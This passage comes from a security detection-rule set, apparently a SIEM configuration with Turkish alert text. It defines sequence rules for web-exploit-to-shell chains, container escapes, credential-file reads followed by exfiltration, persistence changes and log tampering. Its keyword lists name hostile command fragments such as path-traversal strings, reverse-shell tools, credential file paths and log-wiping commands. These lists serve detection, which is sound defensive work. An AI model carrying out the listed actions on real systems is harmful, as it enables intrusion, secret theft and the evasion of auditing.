                                    {"path_decoded_lc_contains_any": ["cmd=", "exec=", "command=", "/bin/sh", "/bin/bash", "../", "/etc/passwd", ".php.jpg", ".phtml", ".jsp"]},
                                    {"path_lc_contains_any": ["%24%28id%29", "%60id%60", "%252e%252e%252f", ".php%00", ".php.jpg", ".phtml", ".jsp"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"path_decoded_lc_contains_any": ["/admin/upload", "/admin/media", "/wp-admin/", "/server-status", "/server-info", "/health", "/healthz", "/readyz", "/livez", "/status"]},
                                        {"ua_lc_contains_any": ["kube-probe", "prometheus", "elb-healthchecker"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
                {
                    "action": ["exec", "process_exec", "lotl_exec", "service_created"],
                    "fields": {
                        "__any__": [
                            {"attack_contains_any": ["webserver_shell_spawn", "curl_pipe", "wget_pipe", "python_shell", "base64_exec"]},
                            {"command_contains_any": ["curl ", "wget ", "python -c", "python3 -c", "php -r", "php -d", "php -f", "/bin/bash", "/bin/sh", "bash -c", "sh -c", "authorized_keys", "/etc/cron", "/etc/systemd/system", ".env", ".pgpass", ".my.cnf", "wp-config.php", "/run/secrets/", "/var/run/secrets/", ".aws/credentials"]},
                        ],
                        "__not__": {
                            "__any__": [
                                {"command_contains_any": ["/health", "/healthz", "/readyz", "/livez", "127.0.0.1/health", "localhost/health", "php artisan schedule:run", "php artisan queue:work", "php artisan migrate", "bin/console cache:warmup", "bin/console cache:clear", "wp cron event run", "wp plugin update", "composer install", "composer update", "phpunit", "drush cr", "occ upgrade"]},
                                {"command_contains_any": ["ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "/var/backups/", "/srv/backup/", "/backup/", "/backups/"]},
                                {"command_token_contains_any": ["healthcheck"]},
                            ]
                        },
                    },
                },
            ],
            "message": "Web exploit/upload sonrasında aynı hostta process abuse görüldü",
            "summary": "Şüpheli web exploit veya upload isteğini kısa süre içinde shell/curl/python/persistence/secret-read davranışı izledi.",
            "operator_note": "Web isteğinin gerçek uygulama bağlamını, aynı hosttaki process parent zincirini ve secret/persistence izlerini doğrulayın.",
            "mitre_tactic": "TA0002",
            "mitre_technique": "T1505.003",
            "tags": ["sequence", "web", "post-exploitation", "process-abuse", "webshell"],
        },
        {
            "id":      "SEQ-053",
            "name":    "Container Exec/Start → Host Abuse",
            "severity": "critical",
            "score":   90,
            "timeout": 420,
            "entity_type": "host",
            "steps": [
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_contains_any": ["docker exec ", "podman exec ", "kubectl exec ", "docker cp ", "podman cp ", "docker run --privileged", "podman run --privileged", "docker start ", "podman start ", "ctr task exec", "crictl exec", "--privileged", "-v /:/host", "--mount type=bind,src=/,dst=/host", "/host/etc/", "/var/lib/kubelet/", "hostPath"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["kubectl exec -n kube-system", "kubectl exec --namespace kube-system", "kubectl exec metrics-server", "kubectl logs ", "kubectl rollout ", "docker pull ", "podman pull ", "docker image pull ", "podman image pull ", "docker inspect ", "podman inspect ", "docker ps ", "podman ps ", "docker start kube-proxy", "docker start pause", "podman start infra", "podman start pause", "/health", "/healthz", "/readyz", "/livez", "-- /bin/true", "-- printenv"]},
                                        {"command_token_contains_any": ["healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
                {
                    "action": ["exec", "process_exec", "lotl_exec", "service_created"],
                    "fields": {
                        "__any__": [
                            {"attack_contains_any": ["curl_pipe", "wget_pipe", "python_shell", "socat_reverse_shell"]},
                            {"command_contains_any": ["/host/etc/", "/host/root/", "/host/home/", "/etc/kubernetes/", "/var/lib/kubelet/", ".env", ".pgpass", ".my.cnf", "wp-config.php", ".kube/config", "docker/config.json", ".aws/credentials", "/run/secrets/", "/var/run/secrets/", "authorized_keys", "/etc/cron", "/etc/systemd/system", "scp ", "sftp ", "rsync ", "rclone ", "curl ", "wget "]},
                        ],
                        "__not__": {
                            "__any__": [
                                {"command_contains_any": ["/health", "/healthz", "/readyz", "/livez", "kubectl logs ", "kubectl rollout status", "docker inspect ", "docker ps "]},
                                {"command_contains_any": ["ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "/var/backups/", "/srv/backup/", "/backup/", "/backups/"]},
                                {"command_token_contains_any": ["healthcheck"]},
                            ]
                        },
                    },
                },
            ],
            "message": "Container exec/start sonrasında host erişimi veya abuse davranışı görüldü",
            "summary": "Container içi exec veya privileged/host-mounted başlangıcı kısa sürede host file access, secret read, persistence ya da outbound abuse ile devam etti.",
            "operator_note": "Container işleminin meşruiyetini, namespace/pod bağlamını ve aynı hostta host-path veya secret erişimi olup olmadığını doğrulayın.",
            "mitre_tactic": "TA0002",
            "mitre_technique": "T1611",
            "tags": ["sequence", "container", "docker", "kubernetes", "host-abuse", "post-exploitation"],
        },
        {
            "id":      "SEQ-054",
            "name":    "Login Success → Secret Read → Archive/Transfer",
            "severity": "critical",
            "score":   92,
            "timeout": 420,
            "entity_type": "user",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_contains_any": ["/.env", "/.netrc", ".pgpass", ".my.cnf", "wp-config.php", "/.kube/config", "kubeconfig", "/docker/config.json", "/.aws/credentials", "/application_default_credentials.json", "/etc/apt/auth.conf", "/etc/apt/auth.conf.d/", "/etc/apt/auth.conf.d", "/legacy_credentials/", "/credentials.db", "/krb5.keytab", "/etc/rhsm/rhsm.conf", "/etc/zypp/credentials.d/", "/etc/zypp/credentials.d", ".keytab", "/run/secrets/", "/var/run/secrets/", "/etc/secrets/", "service-account.json", "serviceaccount.json"]},
                                ]
                            },
                            {
                                "__any__": [
                                    {"command_token_contains_any": ["cat", "head", "tail", "grep", "awk", "sed", "strings", "base64", "python", "python3", "perl", "cp", "rsync", "tar", "zip", "unzip"]},
                                    {"command_contains_any": ["/bin/cat", "/bin/cp", "/usr/bin/rsync", "/bin/tar", "/usr/bin/base64"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_token_contains_any": ["vim", "vi", "nano", "less", "more", "stat", "test", "ls", "kubectl", "docker", "aws", "gcloud", "mysql", "mysqladmin", "my_print_defaults", "psql", "pg_dump", "kinit", "klist", "ssh-keygen", "healthcheck", "backup"]},
                                        {"command_contains_any": ["docker login", "kubectl config view", "kubectl config use-context", "aws configure", "gcloud auth application-default login", "gcloud auth login", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "restic", "borg", "rsnapshot", "duplicity", "/health", "/healthz", "/readyz", "/livez"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {
                                        "__all__": [
                                            {"command_contains_any": ["/tmp/", "/var/tmp/", "/dev/shm/"]},
                                            {
                                                "__any__": [
                                                    {"command_token_contains_any": ["tar", "zip", "7z", "gzip", "xz", "split", "base64", "gpg", "openssl"]},
                                                    {"command_contains_any": ["openssl enc", "gpg -c", "gpg --symmetric", "7z a", "zip -r", "tar -c", "tar cz", "tar -z", "xz -z", "gzip -c", "split -b", "base64 "]},
                                                ]
                                            },
                                        ]
                                    },
                                    {
                                        "__all__": [
                                            {"command_contains_any": ["/tmp/", "/var/tmp/", "/dev/shm/"]},
                                            {
                                                "__any__": [
                                                    {
                                                        "__all__": [
                                                            {"command_token_contains_any": ["scp", "sftp", "rsync", "rclone", "curl", "wget"]},
                                                            {"command_contains_any": ["@", "://", "rsync://", "s3://", "gs://", "remote:"]},
                                                        ]
                                                    },
                                                    {
                                                        "__all__": [
                                                            {"command_token_contains_any": ["aws"]},
                                                            {"command_contains_any": ["aws s3 cp", " s3://"]},
                                                        ]
                                                    },
                                                    {
                                                        "__all__": [
                                                            {"command_token_contains_any": ["nc", "ncat"]},
                                                            {"__not__": {"command_contains_any": [" -l", " --listen", " -k -l", " -lv"]}},
                                                        ]
                                                    },
                                                ]
                                            },
                                        ]
                                    },
                                ]
                            },
                            {
                                "__not__": {
                                "__any__": [
                                        {"command_contains_any": ["/var/backups/", "/srv/backup/", "/backup/", "/backups/", "rsnapshot", "borg", "restic", "duplicity", "timeshift", "logrotate", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "/health", "/healthz", "/readyz", "/livez", "aws configure", "aws s3 sync", "--profile admin", "--profile ops", "backup", "restore", "sosreport", "supportconfig", "apport", "ubuntu-bug"]},
                                        {"command_token_contains_any": ["backup", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Başarılı erişim sonrası secret read ve arşivleme/transfer zinciri görüldü",
            "summary": "Başarılı oturumu kısa sürede credential/secret dosyası erişimi ve ardından staging ya da dışa transfer izledi.",
            "operator_note": "Okunan secret dosyasını, temp staging yolunu ve akışın backup/config-management işi olup olmadığını doğrulayın.",
            "mitre_tactic": "TA0006",
            "mitre_technique": "T1552",
            "tags": ["sequence", "post-auth", "credential-access", "archive", "transfer", "exfiltration"],
        },
        {
            "id":      "SEQ-055",
            "name":    "Login Success → Account or Auth Persistence Change",
            "severity": "critical",
            "score":   85,
            "timeout": 600,
            "entity_type": "user",
            "steps": [
                {"action": ["ssh_login", "identity_login", "vpn_login"], "outcome": "success"},
                {
                    "action": ["sudo", "useradd", "exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"sudo_command_contains_any": ["authorized_keys", ".ssh/authorized_keys", "/etc/sudoers", "/etc/sudoers.d", "/etc/doas.conf", "/etc/security/access.conf", "/etc/pam.d/", "/etc/sssd/sssd.conf", "/etc/login.defs", "/etc/default/useradd", "/etc/ssh/sshd_config", "useradd ", "adduser ", "groupadd ", "groupmod ", "usermod -aG sudo", "usermod -aG wheel", "usermod -aG adm", "usermod -aG admin", "usermod -aG docker", "usermod -aG lxd", "usermod -aG libvirt", "usermod -L", "usermod -U", "usermod -s", "usermod -d", "chsh ", "gpasswd -a", "gpasswd -d", "passwd -l", "passwd -u", "passwd root", "chpasswd", "vipw", "vigr", "visudo -f /etc/sudoers", "visudo -f /etc/sudoers.d"]},
                                    {"command_contains_any": ["authorized_keys", ".ssh/authorized_keys", "/etc/sudoers", "/etc/sudoers.d", "/etc/doas.conf", "/etc/security/access.conf", "/etc/pam.d/", "/etc/sssd/sssd.conf", "/etc/login.defs", "/etc/default/useradd", "/etc/ssh/sshd_config", "useradd ", "adduser ", "groupadd ", "groupmod ", "usermod -aG sudo", "usermod -aG wheel", "usermod -aG adm", "usermod -aG admin", "usermod -aG docker", "usermod -aG lxd", "usermod -aG libvirt", "usermod -L", "usermod -U", "usermod -s", "usermod -d", "chsh ", "gpasswd -a", "gpasswd -d", "passwd -l", "passwd -u", "passwd root", "chpasswd", "vipw", "vigr", "visudo -f /etc/sudoers", "visudo -f /etc/sudoers.d"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"sudo_command_contains_any": ["subscription-manager", "SUSEConnect", "transactional-update", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "systemd-sysusers", "--system", "/usr/sbin/nologin", "/bin/false"]},
                                        {"command_contains_any": ["needrestart", "unattended-upgrades", "subscription-manager", "SUSEConnect", "transactional-update", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "systemd-sysusers", "--system", "/usr/sbin/nologin", "/bin/false"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Başarılı erişim ardından yeni hesap/grup/sudoers/auth-key değişikliği görüldü",
            "summary": "Login sonrası yeni kullanıcı veya yetkili grup değişikliği, sudoers güncellemesi ya da authorized_keys yazımı gözlendi.",
            "operator_note": "Değiştirilen hesabı/grubu, sudoers satırını veya eklenen anahtarı ve bunun planlı yönetim değişikliği olup olmadığını kontrol edin.",
            "mitre_tactic": "TA0003",
            "mitre_technique": "T1098",
            "tags": ["sequence", "post-auth", "persistence", "authorized-keys", "sudoers", "account-manipulation"],
        },
        {
            "id":      "SEQ-069",
            "name":    "Access Or Account Abuse → Service Hijack → Persistence/Execute",
            "severity": "critical",
            "score":   94,
            "timeout": 900,
            "entity_type": "host",
            "steps": [
                {
                    "action": ["ssh_login", "identity_login", "vpn_login", "sudo", "su", "useradd", "passwd_change", "exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__any__": [
                            {"sudo_target_user": "root"},
                            {"su_target": "root"},
                            {"sudo_command_contains_any": ["useradd ", "adduser ", "usermod ", "gpasswd ", "groupadd ", "groupmod ", "passwd ", "authorized_keys", "/etc/sudoers", "/etc/sudoers.d", "/etc/doas.conf"]},
                            {"command_contains_any": ["useradd ", "adduser ", "usermod ", "gpasswd ", "groupadd ", "groupmod ", "passwd ", "authorized_keys", "/etc/sudoers", "/etc/sudoers.d", "/etc/doas.conf"]},
                        ]
                    },
                },
                {
                    "action": ["sudo", "exec", "process_exec", "lotl_exec", "service_created"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"sudo_command_contains_any": ["/etc/systemd/system", ".service.d", "override.conf", "ExecStart=", "ExecReload=", "Environment=", "/etc/default/", "/etc/sysconfig/", "/etc/init.d/", "/etc/rc.d/init.d/", "/etc/rc.local"]},
                                    {"command_contains_any": ["/etc/systemd/system", ".service.d", "override.conf", "ExecStart=", "ExecReload=", "Environment=", "/etc/default/", "/etc/sysconfig/", "/etc/init.d/", "/etc/rc.d/init.d/", "/etc/rc.local"]},
                                    {"service_path_contains_any": ["/etc/systemd/system", ".service.d", "override.conf"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"sudo_command_contains_any": ["ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit", "needrestart", "cloud-init", "systemctl preset", "systemctl reenable", "maintenance"]},
                                        {"command_contains_any": ["ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit", "needrestart", "cloud-init", "systemctl preset", "systemctl reenable", "maintenance", "/health", "/healthz", "/readyz", "/livez"]},
                                        {"command_token_contains_any": ["backup", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
                {
                    "action": ["sudo", "exec", "process_exec", "lotl_exec"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"sudo_command_contains_any": ["systemctl daemon-reload", "systemctl restart", "systemctl reload", "systemctl start", "service ", "invoke-rc.d ", "update-rc.d ", "chkconfig ", "insserv ", "rc-update ", "/usr/local/bin/", "/opt/", "/tmp/", "/var/tmp/", "/dev/shm/", "bash -c", "sh -c", "python -c", "python3 -c", "curl ", "wget "]},
                                    {"command_contains_any": ["systemctl daemon-reload", "systemctl restart", "systemctl reload", "systemctl start", "service ", "invoke-rc.d ", "update-rc.d ", "chkconfig ", "insserv ", "rc-update ", "/usr/local/bin/", "/opt/", "/tmp/", "/var/tmp/", "/dev/shm/", "bash -c", "sh -c", "python -c", "python3 -c", "curl ", "wget "]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"sudo_command_contains_any": ["ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit", "systemctl preset", "systemctl reenable", "logrotate"]},
                                        {"command_contains_any": ["ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit", "systemctl preset", "systemctl reenable", "logrotate", "/health", "/healthz", "/readyz", "/livez"]},
                                        {"command_token_contains_any": ["backup", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Erişim veya hesap kötüye kullanımı sonrası service hijack ve yürütme/persistence görüldü",
            "summary": "Login/privesc/account abuse davranışını kısa sürede systemd/init/service hijack ve ardından daemon restart veya wrapper/payload yürütmesi izledi.",
            "operator_note": "Service override/init script içeriğini, yüklenen wrapper yolunu ve restart sonrası çalışan payload’ın meşru rollout işi olup olmadığını doğrulayın.",
            "mitre_tactic": "TA0003",
            "mitre_technique": "T1543.002",
            "tags": ["sequence", "service-hijack", "daemon-hijack", "execution-flow", "persistence", "post-auth"],
        },
        {
            "id":      "SEQ-056",
            "name":    "Web Exploit/Upload → Persistence",
            "severity": "critical",
            "score":   90,
            "timeout": 420,
            "entity_type": "host",
            "steps": [
                {
                    "action": ["shell_upload", "path_traversal", "sqli_attempt", "http_request"],
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"attack_contains_any": ["shell_upload", "path_traversal", "sql_injection"]},
                                    {"path_decoded_lc_contains_any": ["cmd=", "exec=", "command=", "/bin/sh", "/bin/bash", "../", "/etc/passwd", ".php.jpg", ".phtml", ".jsp"]},
                                    {"path_lc_contains_any": ["%24%28id%29", "%60id%60", "%252e%252e%252f", ".php%00", ".php.jpg", ".phtml", ".jsp"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"path_decoded_lc_contains_any": ["/admin/upload", "/admin/media", "/wp-admin/", "/server-status", "/server-info", "/health", "/healthz", "/readyz", "/livez", "/status"]},
                                        {"ua_lc_contains_any": ["kube-probe", "prometheus", "elb-healthchecker"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
                {
                    "action": ["sudo", "exec", "process_exec", "lotl_exec", "service_created"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_contains_any": ["php -r", "php -d", "php -f", "authorized_keys", "/etc/cron", "/etc/crontab", "/var/spool/cron", "/etc/systemd/system", ".config/systemd/user", ".timer", ".service", "/etc/sudoers", "/etc/sudoers.d", "/etc/profile", "/etc/profile.d", ".bashrc", ".profile", ".zshrc", "systemctl enable", "systemctl start", "systemctl daemon-reload", "loginctl enable-linger"]},
                                    {"command_contains_any": ["authorized_keys", "/etc/cron", "/etc/crontab", "/var/spool/cron", "/etc/systemd/system", ".config/systemd/user", ".timer", ".service", "/etc/sudoers", "/etc/sudoers.d", "/etc/profile", "/etc/profile.d", ".bashrc", ".profile", ".zshrc", "systemctl enable", "systemctl start", "systemctl daemon-reload", "loginctl enable-linger"]},
                                    {"sudo_command_contains_any": ["authorized_keys", "/etc/cron", "/etc/crontab", "/var/spool/cron", "/etc/systemd/system", "/etc/sudoers", "/etc/sudoers.d", "/etc/profile", "/etc/profile.d", "systemctl enable", "systemctl start", "systemctl daemon-reload"]},
                                    {"service_path_contains_any": ["/etc/systemd/system", ".config/systemd/user", ".timer", ".service"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["apt ", "apt-get ", "dpkg ", "rpm ", "dnf ", "yum ", "zypper ", "packagekit", "needrestart", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "systemctl preset", "systemctl reenable", "systemctl restart", "/health", "/healthz", "/readyz", "/livez", "php artisan schedule:run", "php artisan queue:work", "php artisan migrate", "bin/console cache:warmup", "bin/console cache:clear", "wp cron event run", "wp plugin update", "composer install", "composer update", "phpunit", "drush cr", "occ upgrade"]},
                                        {"command_token_contains_any": ["healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Web exploit/upload sonrasında persistence davranışı görüldü",
            "summary": "Şüpheli web exploit veya upload isteğini kısa sürede authorized_keys, cron, systemd ya da sudoers tabanlı kalıcılık izledi.",
            "operator_note": "İsteğin gerçek sömürü olup olmadığını, web sürecinden persistence yoluna geçişi ve bunun deployment/maintenance işi olmadığını doğrulayın.",
            "mitre_tactic": "TA0003",
            "mitre_technique": "T1505.003",
            "tags": ["sequence", "web", "post-exploitation", "persistence", "webshell"],
        },
        {
            "id":      "SEQ-057",
            "name":    "Log Tamper → Persistence or Exfil",
            "severity": "critical",
            "score":   92,
            "timeout": 420,
            "entity_type": "host",
            "steps": [
                {
                    "action": ["sudo", "exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_contains_any": ["systemctl stop auditd", "systemctl disable auditd", "systemctl mask auditd", "systemctl stop rsyslog", "systemctl disable rsyslog", "systemctl mask rsyslog", "systemctl stop systemd-journald", "systemctl disable systemd-journald", "systemctl mask systemd-journald", "service auditd stop", "auditctl -D", "auditctl -e 0", "truncate -s 0 /var/log/", "rm -f /var/log/", "shred /var/log/", "dd if=/dev/null of=/var/log/", "journalctl --vacuum-time", "journalctl --vacuum-size", "journalctl --vacuum-files", "rm -rf /var/log/journal", "history -c", "unset HISTFILE", ".bash_history"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["logrotate", "systemctl restart rsyslog", "systemctl restart systemd-journald", "systemctl reload rsyslog", "apt", "apt-get", "dpkg", "rpm", "dnf", "yum", "zypper", "packagekit", "needrestart", "journalctl --rotate", "journalctl --sync", "tmpfiles --clean"]},
                                        {"command_token_contains_any": ["logrotate", "apt", "dpkg", "rpm", "dnf", "yum", "zypper"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
                {
                    "action": ["sudo", "exec", "process_exec", "lotl_exec", "service_created"],
                    "outcome": "success",
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_contains_any": ["authorized_keys", "/etc/cron", "/etc/crontab", "/var/spool/cron", "/etc/systemd/system", ".config/systemd/user", ".timer", ".service", "/etc/sudoers", "/etc/sudoers.d", "/etc/profile", "/etc/profile.d", "systemctl enable", "systemctl start", "systemctl daemon-reload", "/tmp/", "/var/tmp/", "/dev/shm/", "scp ", "sftp ", "rsync ", "rclone ", "curl ", "wget ", "nc ", "ncat "]},
                                    {"sudo_command_contains_any": ["authorized_keys", "/etc/cron", "/etc/crontab", "/etc/systemd/system", "/etc/sudoers", "/etc/sudoers.d", "systemctl enable", "systemctl start", "systemctl daemon-reload"]},
                                    {"service_path_contains_any": ["/etc/systemd/system", ".config/systemd/user", ".timer", ".service"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["/var/backups/", "/srv/backup/", "/backup/", "/backups/", "rsnapshot", "borg", "restic", "duplicity", "timeshift", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "/health", "/healthz", "/readyz", "/livez"]},
                                        {"command_token_contains_any": ["backup", "healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Log tamper sonrasında persistence veya dışa aktarım davranışı görüldü",
            "summary": "Audit/log zayıflatma veya temizleme adımını kısa sürede kalıcılık ya da veri dışa taşıma davranışı izledi.",
            "operator_note": "Bakım penceresi dışıysa aynı hostta iz silme sonrası persistence/exfil zinciri yüksek önceliklidir.",
            "mitre_tactic": "TA0005",
            "mitre_technique": "T1070.002",
            "tags": ["sequence", "log-tampering", "persistence", "exfiltration", "defense-evasion"],
        },
        {
            "id":      "SEQ-058",
            "name":    "Tool Install → External Transfer or Persistence",
            "severity": "critical",
            "score":   84,
            "timeout": 900,
            "entity_type": "host",
            "steps": [
                {
                    "action": ["pkg_install", "attack_tool_installed"],
                    "fields": {
                        "__any__": [
                            {"package_contains_any": ["nmap", "netcat", "netcat-openbsd", "netcat-traditional", "ncat", "nmap-ncat", "socat", "tcpdump", "hydra", "john", "curl", "wget", "awscli", "aws-cli", "python3-awscli", "rclone", "sshpass", "tmux", "screen"]},
                            {"tool_contains_any": ["nmap", "netcat", "netcat-openbsd", "netcat-traditional", "ncat", "nmap-ncat", "socat", "tcpdump", "hydra", "john", "curl", "wget", "awscli", "aws-cli", "python3-awscli", "rclone", "sshpass", "tmux", "screen"]},
                        ]
                    },
                },
                {
                    "action": ["exec", "process_exec", "lotl_exec", "service_created"],
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {
                                        "__all__": [
                                            {"command_token_contains_any": ["scp", "sftp", "rsync", "rclone", "curl", "wget", "sshpass"]},
                                            {"command_contains_any": ["@", "://", "rsync://", "s3://", "gs://", "remote:"]},
                                        ]
                                    },
                                    {
                                        "__all__": [
                                            {"command_token_contains_any": ["aws"]},
                                            {"command_contains_any": ["aws s3 cp", " s3://"]},
                                        ]
                                    },
                                    {
                                        "__all__": [
                                            {"command_token_contains_any": ["nc", "netcat", "ncat", "socat"]},
                                            {"__not__": {"command_contains_any": [" -l", " --listen", " -k -l", " -lv"]}},
                                        ]
                                    },
                                    {"command_contains_any": ["authorized_keys", "/etc/cron", "/etc/crontab", "/var/spool/cron", "/etc/systemd/system", ".config/systemd/user", ".timer", ".service", "/etc/sudoers", "/etc/sudoers.d", "systemctl enable", "systemctl start", "systemctl daemon-reload", "loginctl enable-linger"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_token_contains_any": ["apt", "apt-get", "dpkg", "dnf", "yum", "rpm", "zypper"]},
                                        {"command_contains_any": ["apt upgrade", "apt-get upgrade", "apt-get dist-upgrade", "dnf upgrade", "yum update", "zypper update", "packagekit", "unattended-upgrades", "subscription-manager", "SUSEConnect", "transactional-update", "systemctl preset", "systemctl reenable", "systemctl restart", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "/health", "/healthz", "/readyz", "/livez", "aws configure", "aws s3 sync", "--profile admin", "--profile ops", "backup", "restore"]},
                                        {"command_token_contains_any": ["healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Şüpheli araç kurulumu sonrasında dışa transfer veya persistence görüldü",
            "summary": "Paket yöneticisi ile kurulan araçlar kısa sürede outbound transfer ya da kalıcılık komutlarında kullanıldı.",
            "operator_note": "Kurulumun change window ile ilişkisini, ilk outbound hedefini veya persistence yolunu kontrol edin.",
            "mitre_tactic": "TA0010",
            "mitre_technique": "T1072",
            "tags": ["sequence", "package-manager", "tooling", "exfiltration", "persistence"],
        },
        {
            "id":      "SEQ-059",
            "name":    "Container Exec/Start → Secret Read or Outbound Abuse",
            "severity": "critical",
            "score":   91,
            "timeout": 420,
            "entity_type": "host",
            "steps": [
                {
                    "action": ["exec", "process_exec", "lotl_exec"],
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {"command_contains_any": ["docker exec ", "podman exec ", "kubectl exec ", "docker cp ", "podman cp ", "docker run --privileged", "podman run --privileged", "docker start ", "podman start ", "ctr task exec", "crictl exec", "--privileged", "-v /:/host", "--mount type=bind,src=/,dst=/host", "/host/etc/", "/var/lib/kubelet/", "hostPath"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["kubectl exec -n kube-system", "kubectl exec --namespace kube-system", "kubectl exec metrics-server", "kubectl logs ", "kubectl rollout ", "docker pull ", "podman pull ", "docker image pull ", "podman image pull ", "docker inspect ", "podman inspect ", "docker ps ", "podman ps ", "docker start kube-proxy", "docker start pause", "podman start infra", "podman start pause", "/health", "/healthz", "/readyz", "/livez", "-- /bin/true", "-- printenv"]},
                                        {"command_token_contains_any": ["healthcheck"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
                {
                    "action": ["exec", "process_exec", "lotl_exec", "service_created"],
                    "fields": {
                        "__all__": [
                            {
                                "__any__": [
                                    {
                                        "__all__": [
                                            {"command_contains_any": ["/host/etc/", "/host/root/", "/host/home/", "/etc/kubernetes/", "/var/lib/kubelet/", ".env", ".pgpass", ".my.cnf", "wp-config.php", ".kube/config", "docker/config.json", ".aws/credentials", "/run/secrets/", "/var/run/secrets/"]},
                                            {
                                                "__any__": [
                                                    {"command_token_contains_any": ["cat", "head", "tail", "grep", "awk", "sed", "strings", "base64", "python", "python3", "perl", "cp", "rsync", "tar", "zip", "unzip"]},
                                                    {"command_contains_any": ["/bin/cat", "/bin/cp", "/usr/bin/rsync", "/bin/tar", "/usr/bin/base64"]},
                                                ]
                                            },
                                        ]
                                    },
                                    {
                                        "__all__": [
                                            {"command_token_contains_any": ["scp", "sftp", "rsync", "rclone", "curl", "wget", "nc", "ncat", "socat", "aws"]},
                                            {"command_contains_any": ["@", "://", "rsync://", "s3://", "gs://", "remote:"]},
                                        ]
                                    },
                                    {"attack_contains_any": ["curl_pipe", "wget_pipe", "python_shell", "socat_reverse_shell"]},
                                ]
                            },
                            {
                                "__not__": {
                                    "__any__": [
                                        {"command_contains_any": ["/health", "/healthz", "/readyz", "/livez", "kubectl logs ", "kubectl rollout status", "docker inspect ", "docker ps ", "ansible", "ansible-playbook", "chef-client", "puppet", "salt-call", "salt-minion", "/var/backups/", "/srv/backup/", "/backup/", "/backups/", "rsnapshot", "borg", "restic", "duplicity", "timeshift"]},
                                        {"command_token_contains_any": ["healthcheck", "backup"]},
                                    ]
                                }
                            },
                        ]
                    },
                },
            ],
            "message": "Container exec/start sonrasında secret read veya outbound abuse görüldü",
            "summary": "Container içi exec/host-mount davranışını kısa sürede host secret erişimi veya dışa bağlantı/transfer izledi.",
            "operator_note": "Container bağlamını, host-path erişimini ve outbound hedefin meşru yönetim/backup işi olup olmadığını doğrulayın.",
            "mitre_tactic": "TA0006",
            "mitre_technique": "T1611",
            "tags": ["sequence", "container", "credential-access", "outbound", "exfiltration", "host-abuse"],
        },
        {
            "id":      "SEQ-060",
            "name":    "Login Success → SSH Prep → Internal Remote Access",
            "severity": "critical",
